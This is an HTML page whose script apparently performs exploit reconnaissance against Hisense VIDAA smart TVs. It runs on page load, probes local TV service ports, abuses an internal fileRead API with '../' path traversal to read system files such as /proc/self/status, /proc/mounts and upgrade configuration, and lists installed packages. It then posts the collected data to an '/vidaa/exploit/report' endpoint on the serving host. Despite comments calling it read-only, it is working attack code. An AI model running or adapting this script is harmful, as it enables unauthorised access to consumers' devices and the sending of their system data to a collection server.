<!DOCTYPE html>
<html>
<head><meta charset="utf-8"><title>VIDAA recon (read-only)</title>
<style>
body{background:#000;color:#0f0;font:26px/1.4 monospace;margin:.6em;}
#st{font-size:36px;color:#ff0;white-space:pre-wrap;} #det{color:#9f9;white-space:pre-wrap;} .bad{color:#f66;}
</style>
</head>
<body>
<div id="st">VIDAA RECON: starting...</div>
<div id="det"></div>
<script>
/* READ-ONLY recon (v2, browser-verified framing).
   Hard service/API allowlist: tvinfo.initialData, hiutils.getOSVersion /
   getVersionStatus / fileRead, pkgmgr.getInstalledPkgs, and one FaaS
   service start (basic/fetcher) as a reachability probe only.
   No download-to-TV, no setters, no writes. */
(function () {
  "use strict";
  var R = { phase: "recon2", t: new Date().toISOString(), ua: navigator.userAgent,
            url: location.href, get_reach: {}, ws_start: [], http_svc: {},
            fileread_variant: null, reads: {}, services: {},
            bridge_globals: {}, hisense_fns: null, errors: [] };
  function det(s) { var d = document.getElementById("det"); d.innerHTML += s + "<br>"; }
  function st(s) { document.getElementById("st").textContent = s; }
  function sleep(ms) { return new Promise(function (r) { setTimeout(r, ms); }); }
  function js(v) { try { return JSON.stringify(v).slice(0, 300); } catch (e) { return String(v).slice(0, 300); } }

  var SVC_ALLOW = { tvinfo: ["initialData"],
                    hiutils: ["getOSVersion", "getVersionStatus", "fileRead"],
                    pkgmgr: ["getInstalledPkgs"] };
  var START_ALLOW = ["basic/fetcher"]; /* start probe only; never any file-transfer api */
  var BASES = ["http://localhost:9009", "http://127.0.0.1:9009",
               "https://localhost:9888", "https://127.0.0.1:9888"];

  /* 1. loopback reachability: no-cors GET. Opaque response = server answered
     (CORS hides body, proves TCP+HTTP); TypeError = refused/unreachable. */
  function getReach(base) {
    return fetch(base + "/", { mode: "no-cors" }).then(function (r) {
      return { reachable: true, note: "opaque " + (r && r.type) };
    }).catch(function (e) {
      return { reachable: false, err: String(e && e.name ? e.name + ": " + e.message : e).slice(0, 120) };
    });
  }

  /* 2. service call over HTTP exactly as community-verified pages do it:
     POST /service/<svc>, content-type json, identifier header, {api,args}. */
  function httpCall(base, svc, api, args, ms) {
    if (!(SVC_ALLOW[svc] && SVC_ALLOW[svc].indexOf(api) >= 0)) {
      R.errors.push("blocked:" + svc + "." + api);
      return Promise.resolve({ blocked: true });
    }
    var ctrl = (typeof AbortController === "function") ? new AbortController() : null;
    var timer = setTimeout(function () { if (ctrl) ctrl.abort(); }, ms || 4000);
    return fetch(base + "/service/" + svc, {
      method: "POST",
      headers: { "content-type": "application/json", "identifier": "" },
      body: JSON.stringify({ api: api, args: args === undefined ? "" : args }),
      signal: ctrl ? ctrl.signal : undefined
    }).then(function (r) {
      return r.text().then(function (t) { clearTimeout(timer); return { status: r.status, text: t.slice(0, 2000) }; });
    }).catch(function (e) {
      clearTimeout(timer);
      return { fetchError: String(e && e.name ? e.name + ": " + e.message : e).slice(0, 160) };
    });
  }

  function parsed(r) {
    if (r && typeof r.text === "string") { try { return JSON.parse(r.text); } catch (e) {} }
    return r;
  }
  function isOk(r) { return !!(r && r.ret === true); }

  /* 3. WS service-start probe (wss then ws, both hosts). Collects frames. */
  function wsStart(schemeHost, ms) {
    return new Promise(function (resolve) {
      var ws, done = false, frames = [];
      function fin(o) { if (done) return; done = true; if (o.frames === undefined) o.frames = frames;
        try { if (ws) ws.close(); } catch (e) {} resolve(o); }
      try { ws = new WebSocket(schemeHost); } catch (e) { return fin({ target: schemeHost, opened: false, exc: String(e) }); }
      ws.onopen = function () {
        try { ws.send(JSON.stringify({ path: "phoenix://service/" + START_ALLOW[0], method: "start",
                                       parameters: {}, session: 901, timeout: 10 })); } catch (e) {}
        setTimeout(function () { fin({ target: schemeHost, opened: true }); }, ms || 1600);
      };
      ws.onmessage = function (m) { if (frames.length < 6) frames.push(String(m.data).slice(0, 250)); };
      ws.onerror = function () { fin({ target: schemeHost, opened: false, err: "ws error" }); };
      ws.onclose = function (c) { fin({ target: schemeHost, opened: false, err: "closed " + c.code }); };
      setTimeout(function () { fin({ target: schemeHost, opened: false, err: "timeout" }); }, 6000);
    });
  }

  function probeGlobals() {
    var names = ["HiUtils_createRequest", "TvInfo_getParam", "vowOS", "omi_platform",
                 "WebSDK_createFileRequest", "Hisense_SetPictureMode"];
    for (var i = 0; i < names.length; i++) {
      try { R.bridge_globals[names[i]] = typeof window[names[i]]; } catch (e) { R.bridge_globals[names[i]] = "err"; }
    }
    try {
      R.hisense_fns = Object.keys(window).filter(function (k) { return k.indexOf("Hisense_") === 0; }).length;
    } catch (e) { R.hisense_fns = "err"; }
  }

  var READ_TARGETS = ["../proc/uptime", "../proc/version", "../proc/self/status",
                      "../proc/mounts", "../proc/net/unix",
                      "../APPS/pkgs/tv.vidaa.jsservice.basic/CHA/services/serviceList.json",
                      "../var/run/superwatch_socket", "../var/local", "../OAD/AppUpgradeSwitch.json"];

  function filterContent(path, content) {
    if (typeof content !== "string") return content;
    if (path === "../proc/self/status") {
      return content.split("\n").filter(function (l) { return /^(Name|Uid|Gid|Groups):/.test(l); }).join(" | ");
    }
    if (path === "../proc/mounts") {
      return content.split("\n").filter(function (l) { return l.indexOf(" rw,") >= 0; }).join(" | ").slice(0, 1200);
    }
    if (path === "../proc/net/unix") {
      return content.split("\n").filter(function (l) { return l.indexOf("superwatch") >= 0; }).join(" | ") || "no superwatch lines";
    }
    return content.slice(0, 1400);
  }

  async function probeFileRead(base, form) {
    for (var j = 0; j < READ_TARGETS.length; j++) {
      var path = READ_TARGETS[j];
      var args = (form === "array") ? { mode: 6, path: [path] } : { mode: 6, path: path };
      var res = parsed(await httpCall(base, "hiutils", "fileRead", args, 5000));
      if (isOk(res)) R.reads[path] = { ok: filterContent(path, res.msg), via: form + "@" + base };
      else R.reads[path] = { err: js(res).slice(0, 220), via: form + "@" + base };
      det("read " + path + " -> " + (isOk(res) ? "OK" : "fail"));
    }
  }

  async function httpProbe() {
    /* variant discovery on /proc/uptime first (string vs one-element array) */
    for (var b = 0; b < BASES.length; b++) {
      var base = BASES[b];
      var os = parsed(await httpCall(base, "hiutils", "getOSVersion", "", 4000));
      var id = parsed(await httpCall(base, "tvinfo", "initialData", "", 4000));
      var vstr = parsed(await httpCall(base, "hiutils", "fileRead", { mode: 6, path: "../proc/uptime" }, 4000));
      var varr = parsed(await httpCall(base, "hiutils", "fileRead", { mode: 6, path: ["../proc/uptime"] }, 4000));
      R.http_svc[base] = {
        getOSVersion: isOk(os) ? String(os.msg).slice(0, 120) : js(os),
        initialData: isOk(id) ? "OK" : js(id),
        read_string: isOk(vstr) ? String(vstr.msg).slice(0, 60) : js(vstr),
        read_array: isOk(varr) ? String(varr.msg).slice(0, 60) : js(varr)
      };
      det("base " + base + ": os=" + R.http_svc[base].getOSVersion + " id=" + R.http_svc[base].initialData);
      if (isOk(id) && !R.services.initialData) R.services.initialData = id.msg;
      var form = null;
      if (isOk(varr)) form = "array"; else if (isOk(vstr)) form = "string";
      if (form && !R.fileread_variant) {
        R.fileread_variant = form;
        R.reads["../proc/uptime"] = { ok: String(parsed(form === "array" ? varr : vstr).msg).slice(0, 200), via: form + "@" + base };
        await probeFileRead(base, form);
        return;
      }
      if (isOk(os) || isOk(id)) {
        /* bridge answers but fileRead failed on both forms here: try other fileRead-only info, keep scanning */
        continue;
      }
    }
  }

  async function run() {
    st("VIDAA RECON: running...");
    probeGlobals();
    for (var g = 0; g < BASES.length; g++) R.get_reach[BASES[g]] = await getReach(BASES[g]);
    det("reach: " + js(R.get_reach));
    var opened = false;
    var wsTargets = ["wss://localhost:9888", "ws://localhost:9888", "wss://127.0.0.1:9888", "ws://127.0.0.1:9888"];
    for (var w = 0; w < wsTargets.length && !opened; w++) {
      var a = await wsStart(wsTargets[w]);
      R.ws_start.push(a);
      det("ws " + a.target + " opened=" + a.opened);
      opened = a.opened;
    }
    await httpProbe();
    var pkg = parsed(await httpCall(Object.keys(R.http_svc)[0] || BASES[0], "pkgmgr", "getInstalledPkgs", "", 5000));
    if (isOk(pkg)) {
      var list = pkg.msg || [];
      R.pkglist_trunc = { count: list.length || 0,
        has_jsservice_basic: (list.some ? list.some(function (p) { return String(p.name || p).indexOf("jsservice.basic") >= 0; }) : false),
        sample: js(list).slice(0, 900) };
    } else R.pkglist_trunc = pkg;
    if (!R.fileread_variant && !R.services.initialData && !opened) R.errors.push("no phoenix transport reachable from page");
    st("VIDAA RECON: done - sending report...");
    report();
  }

  function report() {
    var body = JSON.stringify(R);
    fetch("/vidaa/exploit/report", { method: "POST", headers: { "content-type": "application/json" }, body: body })
      .then(function (r) { st("VIDAA RECON: REPORT DELIVERED (http " + r.status + ")"); })
      .catch(function () {
        st("VIDAA RECON: SEND FAILED - copy URL bar + console");
        R.errors.push("report send failed");
      });
  }

  if (document.readyState === "complete" || document.readyState === "interactive") run();
  else document.addEventListener("DOMContentLoaded", run);
})();
</script>
</body>
</html>
